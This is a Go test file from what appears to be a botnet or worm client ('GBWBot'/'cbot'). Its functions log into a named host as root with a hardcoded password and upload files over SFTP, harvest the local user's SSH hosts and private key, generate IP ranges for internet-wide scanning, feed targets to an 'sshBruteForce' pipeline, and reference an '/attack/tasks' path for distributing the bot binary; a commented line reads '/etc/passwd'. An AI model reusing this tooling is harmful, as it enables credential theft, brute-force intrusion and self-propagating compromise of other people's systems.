package main

import (
	"context"
	"encoding/hex"
	"fmt"
	"github.com/cbot/proto/http"
	"github.com/cbot/proto/redis"
	"github.com/cbot/proto/ssh"
	"github.com/cbot/proto/transport"
	"github.com/cbot/targets/genip"
	"github.com/cbot/targets/local"
	"github.com/cbot/targets/source"
	"github.com/cbot/utils/netutils"
	"github.com/d5/tengo/compiler/token"
	"github.com/d5/tengo/objects"
	"github.com/d5/tengo/script"
	"github.com/d5/tengo/stdlib"
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func testSSH() {

	host := "www.gbw3bao.com"
	port := 22
	user := "root"
	pass := "ffff"
	fpath := ""
	remoteDir := "/tmp/"
	downloadDir := "D:\\"

	sshclient, err := ssh.LoginWithPasswd(host, port, user, pass, 10000)
	//sshclient,err := ssh.LoginNoPassword(host,port,user,1000)

	if err != nil {

		fmt.Println(err)
		return
	}

	defer sshclient.Close()

	//res,_:=sshclient.RunCmd("cat sum.c;cat /etc/passwd")

	ftp, err := ssh.NewSftpClient(sshclient)
	if err != nil {

		fmt.Println(err)
		return
	}
	defer ftp.Close()

	ftp.UPloadFile(fpath, remoteDir)

	ftp.DownloadFile("/tmp/main.go", downloadDir)

	//res,_:=sshclient.RunCmd("cat /tmp/main.go")

	//fmt.Println(string(res))

}

func testHttp() {

	host := "www.163.com"
	port := 443

	client := http.NewHttpClient(host, port, true, 10000)
	request := http.NewHttpRequest("get", "/").AddHeader("User-Agent", "GOClient")

	if resp, err := client.Send(request); err != nil {

		fmt.Println(err)
	} else {

		fmt.Println(resp.GetHeaderValue("Content-Type"))
		fmt.Println(resp.GetStatusCode())
		fmt.Println(resp.GetBodyAsString())
	}
}

type Test struct {

	//tengo.ObjectImpl
	c int
}

func (t *Test) BinaryOp(op token.Token, rhs objects.Object) (objects.Object, error) {
	panic("implement me")
}

func (t *Test) IsFalsy() bool {
	panic("implement me")
}

func (t *Test) Equals(another objects.Object) bool {
	panic("implement me")
}

func (t *Test) Copy() objects.Object {
	panic("implement me")
}

func (t *Test) TypeName() string {

	return "test"
}

func (t *Test) String() string {

	return "test"
}

func (t *Test) Call(args ...objects.Object) (objects.Object, error) {

	fmt.Println(args[1])
	fmt.Println(t.c)
	tt := args[2].(*Test)
	fmt.Println(tt.c)

	return &objects.Int{
		Value: 12,
	}, nil

}

func (t *Test) CanCall() bool {

	return true
}

func newTest(args ...objects.Object) (objects.Object, error) {

	var t Test
	t.c = 1234
	fmt.Println(",,,,,,,,,,,,,,,,,,,,,,,,,,,")
	return &t, nil
}

type TestGetCall struct {
	Test
	fmap  map[string]interface{}
	value string
}

func newGetCall(args ...objects.Object) (objects.Object, error) {

	return &TestGetCall{
		Test: Test{},
		fmap: map[string]interface{}{
			"get": newGetFunc,
			"set": newSetFunc,
		},
		value: "",
	}, nil
}

func (tc *TestGetCall) IndexGet(index objects.Object) (value objects.Object, err error) {

	k, _ := objects.ToString(index)

	if k == "get" {

		return &GetFunc{
			Test: Test{},
			name: "get",
			tgc:  tc,
		}, nil
	}

	if k == "set" {

		return &SetFunc{
			Test: Test{},
			name: "set",
			tgc:  tc,
		}, nil
	}

	return nil, nil
}

type GetFunc struct {
	Test
	name string
	tgc  *TestGetCall
}

func newGetFunc() *GetFunc {

	return &GetFunc{
		Test: Test{},
		name: "get",
	}
}

func (tc *GetFunc) Call(args ...objects.Object) (objects.Object, error) {

	return objects.FromInterface(tc.tgc.value)
}

type SetFunc struct {
	Test
	name string
	tgc  *TestGetCall
}

func newSetFunc() *SetFunc {

	return &SetFunc{
		Test: Test{},
		name: "set",
	}
}

func (tc *SetFunc) Call(args ...objects.Object) (objects.Object, error) {

	tc.tgc.value, _ = objects.ToString(args[0])

	return nil, nil
}

var moduleMap objects.Object = &objects.ImmutableMap{
	Value: map[string]objects.Object{
		"newTest": &objects.UserFunction{
			Name:  "new_test",
			Value: newTest,
		},
		"newCall": &objects.UserFunction{
			Name:  "new_tcall",
			Value: newGetCall,
		},
	},
}

func (Test) Import(moduleName string) (interface{}, error) {

	fmt.Println(moduleName)
	switch moduleName {
	case "test":
		return moduleMap, nil
	default:
		return nil, fmt.Errorf("undefined module %q", moduleName)
	}
}

func testScript() {

	path := ""
	data, _ := ioutil.ReadFile(path)
	script := script.New(data)

	mm := objects.NewModuleMap()
	mm.Add("http", http.HttpTengo{})
	mm.AddMap(stdlib.GetModuleMap("fmt"))
	script.SetImports(mm)

	// run the script
	_, err := script.RunContext(context.Background())
	if err != nil {
		//panic(err)
	}

	//objects.Map{}

}

func testTcpScript() {

	path := `D:\shajf_dev\self\GBWBot\GBWClientBot\src\github.com\cbot\cmd\test\tcp.tengo`
	data, _ := ioutil.ReadFile(path)
	script := script.New(data)

	mm := objects.NewModuleMap()
	mm.Add("transport", transport.TransportTengo{})

	mm.AddMap(stdlib.GetModuleMap("fmt"))
	script.SetImports(mm)

	script.Compile()
	// run the script
	_, err := script.RunContext(context.Background())
	if err != nil {
		//panic(err)
	}

	//objects.Map{}

}

func testConnection() {

	addr := "www.sohu.com:443"
	timout := 30 * time.Second

	req := "GET / HTTP/1.1\r\nHost: www.sohu.com\r\nUser-Agent: go-client\r\n\r\n"

	conn, err := transport.Dial("tcp", addr, transport.DialConnectTimeout(timout),
		transport.DialReadTimeout(timout),
		transport.DialWriteTimeout(timout),
		transport.DialTLSHandshakeTimeout(timout),
		transport.DialTLSSkipVerify(true),
		transport.DialUseTLS(true))

	if err != nil {
		fmt.Println(err)
		return
	}

	//conn.WriteString(req)
	conn.WriteHex(hex.EncodeToString([]byte(req)))
	conn.Flush()

	data, err := conn.ReadBytes(1024)

	defer conn.Close()

	fmt.Println(string(data))

}

func testIPConstraint() {

	con := genip.NewConstraint(0)

	con.Set(netutils.IPStrToInt("128.128.0.0"), 1, 22)
	con.Set(netutils.IPStrToInt("128.128.0.0"), 1, 1)
	con.Set(netutils.IPStrToInt("128.0.0.0"), 1, 1)
	con.Set(netutils.IPStrToInt("10.0.0.0"), 24, 1)
	con.Set(netutils.IPStrToInt("10.0.0.0"), 24, 0)
	con.Set(netutils.IPStrToInt("10.11.12.0"), 24, 1)
	con.Set(netutils.IPStrToInt("141.212.0.0"), 16, 0)

	fmt.Printf("count(0)=%d\n", con.CountIPS(0))
	fmt.Printf("count(1)=%d\n", con.CountIPS(1))
	fmt.Printf("%d\n", con.LookupIP(netutils.IPStrToInt("10.11.12.0")))

	fmt.Println(con.CountIPS(0)+con.CountIPS(1) == 1<<32)

}

func testIPGen() {

	//wlist := []string {"192.168.1.0/24","10.0.1.0/24"}
	//blist := []string {"192.168.1.1","10.0.1.1","10.0.1.0"}

	ipg, _ := genip.NewIPGen("", "", []string{}, []string{}, true)

	var c uint32 = 0
	for ip := ipg.GetCurIP(); ip != 0; ip = ipg.GetNextIP() {

		fmt.Println(netutils.IPv4StrBig(ip))
		c++
	}

	fmt.Println(c)
}

func testRedis() {

	host := "192.168.198.128"
	port := 6379

	cli := redis.NewRedisClient(host, port, "", 10000, 2)

	//fmt.Println(cli.Info())

	fmt.Println(cli.Do("set", "bb", "fuck"))
	fmt.Println(cli.Do("get", "bb"))
	fmt.Println(cli.Info())
}

func testAddr() {

	addrs := local.Addrs(true)

	for _, addr := range addrs {

		fmt.Println(addr.NetWorkRange())
		fmt.Println(addr.Mac())
	}

	fmt.Println(local.GetOutIP())
	fmt.Println(local.GetWorkingIPRange(true))
	fmt.Println(os.UserHomeDir())

	fmt.Println(local.ISLocalIP("192.168.2.109"))

	fmt.Println(local.GetWorkingIP())

	fmt.Println(local.GetMacByIP(local.GetWorkingIP().String()))
}

func testSSHHost() {

	sshLoginInfo := local.CollectSSHLoginInfo()

	fmt.Println(sshLoginInfo.User())
	fmt.Println(sshLoginInfo.PrivateKey())

	for _, sshHost := range sshLoginInfo.Hosts() {

		fmt.Printf("{ip:%s,host:%s,port:%d,user:%s,userName:%s}\n", sshHost.IP(), sshHost.Host(), sshHost.Port(), sshHost.UserName(), sshHost.UserName())
	}

}

func testScriptSource() {

	fpath1 := `D:\shajf_dev\self\GBWBot\GBWClientBot\src\github.com\cbot\cmd\test\scriptSource.tengo`
	fpath2 := `D:\shajf_dev\self\GBWBot\GBWClientBot\src\github.com\cbot\script\source\ipgenSource.tengo`

	rtypes := []string{"sshBruteForce"}

	spool := source.NewSourcePool()

	ss1, err := source.NewScriptSourceFromFile(spool, "test1", rtypes, fpath1)

	if err != nil {

		fmt.Println(err)
		return
	}

	ss2, err := source.NewScriptSourceFromFile(spool, "test2", rtypes, fpath2)

	if err != nil {

		fmt.Println(err)
		return
	}

	rch := spool.SubTarget("treader", 10, func(target source.Target) bool {

		return true
	})

	spool.StartSource(ss1)
	spool.StartSource(ss2)

	go func() {
		for {

			select {

			case entry := <-rch:

				fmt.Printf("{ip:%s,host:%s,port:%d,proto:%s,app:%s}\n",
					entry.IP(), entry.Host(), entry.Port(), entry.Proto(), entry.App())
			}

		}
	}()

	/*
		go func (){for {

			entry,err:= reader2.Read()

			if err!=nil {

				fmt.Println(err)
				break
			}

			if entry == nil {

				continue
			}

			fmt.Printf("{ip:%s,host:%s,port:%d,proto:%s,app:%s}----------\n",
				entry.IP(),entry.Host(),entry.Port(),entry.Proto(),entry.App())
		}}()*/

	for {

		spool.StartSource(ss2)

		time.Sleep(10 * time.Second)

	}

}

func testOSCmd() {

	args := []string{"-all"}

	cmd := exec.Command("ipconfig", args...)

	data, err := cmd.CombinedOutput()

	fmt.Println(string(data), err)

}

func main() {

	//testConnection()
	//testScript()
	//testHttp()

	//testTcpScript()

	//testIPConstraint()
	//testAES()

	//testIPGen()

	//testSSH()
	//testRedis()
	//testAddr()
	//testSSHHost()

	//testScriptSource()

	//testOSCmd()

	path := "/attack/tasks/taskId/pnodeId/cbot_linux"

	paths := strings.Split(path, "/")

	fmt.Println(len(paths))
	fmt.Println(paths[3])
	fmt.Println(paths[len(paths)-1])
	fmt.Println(runtime.GOARCH)
	fmt.Println(runtime.GOOS)

	m := make(map[string]bool)

	m["root"] = true
	m["root"] = false

	fmt.Println(m["root"])
	fmt.Println(len(m))
}
